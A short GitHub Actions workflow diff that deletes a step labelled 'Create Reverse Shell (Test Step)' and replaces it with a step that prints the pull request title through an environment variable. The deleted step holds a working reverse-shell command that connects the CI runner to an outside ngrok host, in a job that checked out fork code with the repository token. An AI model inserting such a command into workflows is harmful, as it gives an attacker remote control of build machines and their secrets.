@@ -9,18 +9,9 @@ permissions:
 
 jobs:
   update-readme-fork:
-    if: ${{ github.event.pull_request.head.repo.full_name != github.repository }}
     runs-on: ubuntu-latest
-
+    env:
+      TITLE: ${{ github.event.pull_request.title }}
     steps:
-      - name: Checkout PR branch
-        uses: actions/checkout@v4
-        with:
-          repository: ${{ github.event.pull_request.head.repo.full_name }}
-          ref: ${{ github.event.pull_request.head.ref }}  # Ensure branch checkout
-          fetch-depth: 0
-          token: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Create Reverse Shell (Test Step)
-        run: |
-          bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/15476 0>&1'
+      - name: Print PR Title
+        run: echo "$TITLE"
